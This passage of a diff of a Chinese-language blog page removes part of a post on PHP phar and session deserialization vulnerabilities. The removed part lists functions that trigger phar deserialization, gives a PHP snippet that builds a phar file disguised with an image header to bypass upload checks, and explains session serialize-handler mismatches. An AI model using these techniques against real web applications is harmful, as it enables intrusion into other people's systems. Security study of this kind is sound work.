is_executable / is_file / is_link / is_readable / is_writeable / is_writable</span><br><span class="line">parse_ini_file</span><br><span class="line">unlink</span><br><span class="line">copy</span><br><span class="line"><span class="keyword">include</span></span><br><span class="line">扩展</span><br><span class="line">exif_thumbnail</span><br><span class="line">exif_imagetype</span><br><span class="line">imageloadfont</span><br><span class="line">imagecreatefrom***</span><br><span class="line">hash_hmac_file</span><br><span class="line">hash_file</span><br><span class="line">hash_update_file</span><br><span class="line">md5_file</span><br><span class="line">sha1_file</span><br><span class="line">get_meta_tags</span><br><span class="line">get_headers</span><br><span class="line">getimagesize</span><br><span class="line">getimagesizefromstring</span><br></pre></td></tr></table></figure>
-
-<p>绕过图片头检测</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;&#125;</span><br><span class="line">$jpeg_header_size = </span><br><span class="line"><span class="string">&quot;图片&quot;</span>;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;setStub($jpeg_header_size.<span class="string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><h4 id="sseion的简单介绍"><a href="#sseion的简单介绍" class="headerlink" title="sseion的简单介绍"></a>sseion的简单介绍</h4><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDECPDEDEDFCOHAGOGH"></p>
-<p><strong>PHP session 变量用于存储有关用户会话的信息，或更改用户会话的设置。Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。</strong></p>
-<p>Session 的工作机制是：为每个访问者创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，亦或通过 URL 进行传导。</p>
-<p><strong>开启session</strong></p>
-<p>在您把用户信息存储到 PHP session 中之前，首先必须启动会话。</p>
-<p><strong>注释：</strong>session_start() 函数必须位于 <html> 标签之前：</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDCCPDEDEDDCOHAGOGH"></p>
-<p><strong>终结session</strong></p>
-<p><img src="F:\信安\sql\444.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDFCPDEDEDGCOHAGOGH"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDHCPDEDEDHCOHAGOGH"></p>
-<h4 id="开启session并执行文件"><a href="#开启session并执行文件" class="headerlink" title="开启session并执行文件"></a>开启session并执行文件</h4><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDGCPDEDEDICOHAGOGH"></p>
-<p><strong>删除文件</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2017/12/16</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">session_start();<span class="comment">// 打开session</span></span><br><span class="line">$_SESSION[<span class="string">&quot;demo1&quot;</span>] = <span class="string">&quot;default_1&quot;</span>;</span><br><span class="line">var_dump(session_name());</span><br><span class="line"><span class="comment">//session的销毁</span></span><br><span class="line">session_destroy();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="session存储方式"><a href="#session存储方式" class="headerlink" title="session存储方式"></a>session存储方式</h4><p>PHP中的session中的文件内容默认是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDICPDEDEDACOHAGOGH"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以如下代码为例，查看不同存储引擎存储的结果</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);<span class="comment">//这里换不同的存储引擎</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;username&#x27;</span>] = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDEDJDJCPDEDEDBCOHAGOGH"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDFDADACPDEDEDCCOHAGOGH"></p>
-<h4 id="有-SESSION赋值的反序列化"><a href="#有-SESSION赋值的反序列化" class="headerlink" title="有$_SESSION赋值的反序列化"></a>有$_SESSION赋值的反序列化</h4><p>当网站序列化存储 <code>session</code> 与反序列化读取 <code>session</code> 的方式不同时，就可能导致 <code>session</code> 反序列化漏洞的产生。 一般都是以 <code>php_serialize</code> 序列化存储 <code>session</code>， 以 <code>PHP</code> 反序列化读取 <code>session</code>，造成反序列化攻击。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDCDDDFDFDADBCPDEDFDECOHAGOGH"></p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PHP session 常见利用点 - 先知社区  https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;8221#toc-5</span><br><span class="line"></span><br><span class="line">反序列化 | Welcome eeknight.top  http:&#x2F;&#x2F;eeknight.top&#x2F;2020&#x2F;10&#x2F;03&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97&#x2F;</span><br><span class="line"></span><br><span class="line">反序列化 | shasha  https:&#x2F;&#x2F;zzdooo.gitee.io&#x2F;sddoo&#x2F;2020&#x2F;10&#x2F;02&#x2F;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&#x2F;</span><br><span class="line"></span><br><span class="line">初探phar:&#x2F;&#x2F; - 先知社区  https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2715</span><br><span class="line"></span><br><span class="line">原理+实践掌握(PHP反序列化和Session反序列化) - 先知社区  https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7366#toc-4</span><br><span class="line"></span><br><span class="line">Phar反序列化拓展攻击学习笔记 | Xiao Leung&#39;s Blog  http:&#x2F;&#x2F;www.plasf.cn&#x2F;2019&#x2F;12&#x2F;12&#x2F;Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB&#x2F;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1990,7 +1973,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
